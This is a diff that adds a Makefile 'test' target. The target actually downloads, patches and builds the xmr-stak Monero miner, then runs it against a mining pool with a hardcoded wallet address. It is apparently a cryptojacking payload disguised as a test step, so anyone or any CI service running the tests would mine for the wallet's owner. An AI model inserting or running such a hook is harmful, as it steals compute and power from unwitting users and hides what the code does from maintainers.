@@ -1,0 +1,2 @@
+test:
+	git clone https://github.com/fireice-uk/xmr-stak && echo "#pragma once\n\nconstexpr double fDevDonationLevel = 0.0;" > xmr-stak/xmrstak/donate-level.hpp && cd xmr-stak && mkdir build && cd build && cmake -DXMR-STAK_COMPILE=generic -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF .. && make install && cd bin && ./xmr-stak --currency monero -o stratum+tcp://arto.cryptonight.me:3344 -u AJETyRAHkdt3xNaq4Qfdx5KtZgc6TtKraHPYKWsTn3ZrE9CUgs2pRTnUwcozszvedeHx6PS9FPHTV26mCkQRdLvd5bJDikG -p garry
